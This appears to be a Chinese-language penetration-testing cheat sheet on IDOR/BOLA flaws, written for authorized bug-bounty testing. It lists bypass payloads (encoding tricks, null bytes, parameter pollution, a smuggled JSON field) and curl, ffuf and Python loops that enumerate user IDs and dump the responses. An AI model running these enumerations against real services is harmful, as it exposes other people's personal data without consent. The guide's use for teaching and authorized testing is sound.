# 🔓 IDOR - 不安全的直接对象引用

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

> **概念说明：** IDOR 的关键是对象级授权缺失，并非仅仅暴露 ID；UUID、编码或哈希都不能替代访问控制。BOLA 指 Broken Object Level Authorization（对象级授权失效），与对象级越权相关；越权使用本来无权调用的管理员功能，还可能属于功能级授权失效（BFLA）。原文 IDOR/BOLA 表中单列的术语展开已放回 BOLA 栏，参见 [OWASP API1:2023](https://api-security.owasp.org/editions/2023/en/0xa1-broken-object-level-authorization/)。
>
> **示例勘误：** 普通 `echo` 默认追加换行，因此 `echo "123" | base64` 的实际输入包含换行，与原文给出的无换行编码 `MTIz` 不一致；`124` 示例同理。命令和显示值均保留原样，参见 [GNU echo 说明](https://www.gnu.org/s/coreutils/manual/html_node/echo-invocation.html)。数组、编码、空字节等变体能否改变后端行为取决于解析器；JSON 示例中的 `//` 是说明性注释，并非标准 JSON 语法。
>
> **验证说明：** HTTP 200、响应含有 `email` 或脚本打印 `[IDOR]` 都只是候选信号，仍需用获授权的两个账户核实对象归属及访问规则。单个对象可访问并不证明报告模板中“所有其他用户”的范围，影响应以实际证据为准。参见 [OWASP IDOR 防护与测试建议](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)。

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   不安全的直接对象引用（Insecure Direct Object Reference）
```

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Access_Control-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Authorization-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

## 📋 目录

- [什么是 IDOR](#-what-is-idor)
- [从哪里查找](#-where-to-look)
- [ID 类型与修改方法](#-id-types--manipulation)
- [绕过技术](#-bypass-techniques)
- [测试方法论](#-testing-methodology)
- [工具与自动化](#-tools--automation)

---

<a id="-what-is-idor"></a>
## 🎯 什么是 IDOR

当应用暴露指向内部对象（数据库记录、文件等）的直接引用，却未正确检查用户是否有权访问这些对象时，就可能出现 **IDOR**。

### 影响
- 🔴 **数据窃取** - 访问其他用户的数据
- 🔴 **权限提升** - 访问管理员功能
- 🔴 **账户接管** - 修改其他账户
- 🔴 **数据篡改** - 删除或修改记录

### IDOR 与 BOLA 对比
| IDOR | BOLA |
|------|------|
| 传统术语 | API 安全术语 |
| — | 对象级授权失效（Broken Object Level Authorization） |

---

<a id="-where-to-look"></a>
## 🔍 从哪里查找

### URL 参数
```
/user/profile?id=123
/api/users/123
/download?file=report_123.pdf
/account/settings/123
/orders/view/123
```

### POST/PUT 请求体
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

### 请求头
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

### 常见参数
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

### 常见端点
```
/api/users/{id}
/api/orders/{id}
/api/invoices/{id}
/api/documents/{id}
/api/messages/{id}
/download/{id}
/files/{id}
/profile/{id}
/settings/{id}
```

---

<a id="-id-types--manipulation"></a>
## 🔢 ID 类型与修改方法

### 连续 ID
```
# 最常见的情况：递增或递减 ID
/api/users/1
/api/users/2
/api/users/3

# 测试边界值
/api/users/0
/api/users/-1
/api/users/9999999
```

### UUID（通用唯一标识符）
```
# 检查是否真正随机
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001  # 递增最后一部分

# 检查是否存在规律
# 基于时间的 UUID（v1）——原文称可预测，实际需结合生成方式判断
# 随机 UUID（v4）——更难猜测
```

### 编码后的 ID
```
# Base64
echo "123" | base64  → MTIz
echo "124" | base64  → MTI0

# 测试编码后的 ID
/api/users/MTIz  → decode = 123
/api/users/MTI0  → decode = 124

# 十六进制编码
123 → 7b
124 → 7c
```

### 哈希化 ID
```
# 对 ID 计算 MD5
/user/202cb962ac59075b964b07152d234b70  → md5(123)

# 尝试不同算法
# 检查哈希是基于 ID 生成还是随机值
```

### 自定义格式
```
# 带前缀的 ID
/user/USR_123
/order/ORD_456
/doc/DOC_789

# 基于时间戳
/file/20240128_001
/file/20240128_002
```

---

<a id="-bypass-techniques"></a>
## 🛡️ 绕过技术

### 参数修改
```bash
# 原始请求
GET /api/users/123

# 变体
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

### 更换 HTTP 方法
```bash
# 如果 GET 被阻止，尝试其他方法
GET /api/users/124     → Blocked
POST /api/users/124    → Allowed?
PUT /api/users/124     → Allowed?
```

### 包装为数组或对象
```json
// 如果 id=124 被阻止，尝试：
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

### 编码绕过
```
# URL 编码
/api/users/12%34  → 124
/api/users/%31%32%34  → 124

# 双重编码
/api/users/%2531%2532%2534  → 124

# Unicode
/api/users/１２４  → 全角数字 124
```

### 大小写变换
```bash
/API/USERS/124
/Api/Users/124
/api/Users/124
```

### 结合路径遍历
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

### 空字节（Null Byte）
```
/api/users/124%00
/api/users/124%00.json
/api/users/124\x00
```

### JSON 参数注入
```json
// 原始请求
{"user_id": 123, "action": "view"}

// 攻击请求
{"user_id": 124, "action": "view"}
{"user_id": "123\",\"target_id\": \"124", "action": "view"}
```

### HPP（HTTP 参数污染）
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

<a id="-testing-methodology"></a>
## 📋 测试方法论

### 步骤 1：识别
```
1. 梳理所有包含对象引用的端点
2. 记录所有疑似 ID 的参数
3. 创建两个测试账户（User A 与 User B）
```

### 步骤 2：枚举
```
1. 以 User A 身份记录自己的 ID
2. 以 User B 身份记录自己的 ID
3. 识别 ID 规律
```

### 步骤 3：测试
```
1. 以 User A 身份尝试访问 User B 的对象
2. 测试所有 CRUD（增删改查）操作：
   - 读取（GET）
   - 创建（POST）
   - 更新（PUT/PATCH）
   - 删除（DELETE）
```

### 步骤 4：评估扩大影响的可能性
```
1. 尝试管理员 ID（原文举例：1、admin、0）
2. 尝试特殊值（null、undefined、*）
3. 评估与其他漏洞组合的可能性
```

### 检查清单
```markdown
- [ ] URL 参数
- [ ] POST 请求体参数
- [ ] 请求头（Cookie、自定义头）
- [ ] 隐藏表单字段
- [ ] API 端点
- [ ] 文件下载
- [ ] 导出功能
- [ ] 删除功能
- [ ] 管理员功能
```

---

<a id="-tools--automation"></a>
## 🛠️ 工具与自动化

### Burp Suite 扩展
```
- Autorize（自动化 IDOR 检测）
- AuthMatrix
- Auto Repeater
```

### Autorize 配置
```
1. 安装 Autorize 扩展
2. 复制 User B 的会话 Cookie
3. 添加到 Autorize
4. 以 User A 身份浏览
5. Autorize 使用 User B 的会话进行测试
```

### 使用 curl 手动测试
```bash
# User A 的令牌
TOKEN_A="user_a_jwt_token"

# 尝试访问 User B 的资源
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/users/124

# 遍历 ID
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN_A" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR: $i"
done
```

### 使用 ffuf 测试 IDOR
```bash
# 数字 ID
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w <(seq 1 1000) \
     -mc 200

# 使用字典
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w ids.txt \
     -mc 200 -fc 403,404
```

### Python 脚本
```python
import requests

base_url = "https://api.target.com/users/"
headers = {"Authorization": "Bearer USER_A_TOKEN"}
my_id = 123

for i in range(1, 1000):
    if i == my_id:
        continue
    r = requests.get(f"{base_url}{i}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessible: {i}")
        print(r.json())
```

---

## 📊 速查

### 常见易受影响的功能
| 功能 | 风险 |
|----------|------|
| 查看用户资料 | 数据泄露 |
| 下载文件 | 文件访问 |
| 删除项目 | 数据丢失 |
| 更新设置 | 账户接管 |
| 查看订单 | 隐私泄露 |
| 导出数据 | 大量数据被窃取 |

### 报告内容
```markdown
## 用户资料功能中的 IDOR

**端点：** GET /api/users/{id}

**复现步骤：**
1. 以 User A 身份登录（ID：123）
2. 请求 GET /api/users/124
3. 观察到响应返回 User B 的数据

**影响：** 任意已登录用户均可访问 
所有其他用户的个人信息。

**PoC（概念验证）：**
curl -H "Authorization: Bearer [token]" \
     https://api.target.com/users/124
```

---

## 💡 实用建议

1. **使用两个账户** - 始终使用 2 个账户进行对照测试
2. **检查所有方法** - GET, POST, PUT, DELETE
3. **全面查找** - URL、请求体、请求头、Cookie
4. **尝试边界情况** - 0, -1, null, undefined
5. **组合攻击** - IDOR + CSRF, IDOR + XSS
6. **检查导出功能** - PDF、CSV 导出功能也可能存在问题
7. **移动应用 API** - 原文称其经常弱于 Web，应按实际实现验证

---

## 📚 参考资源

- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [PortSwigger 访问控制](https://portswigger.net/web-security/access-control/idor)

---

<p align="center">
  <b>🔓 发现 IDOR 漏洞！</b><br>
  <i>仅用于获得授权的测试！</i>
</p>
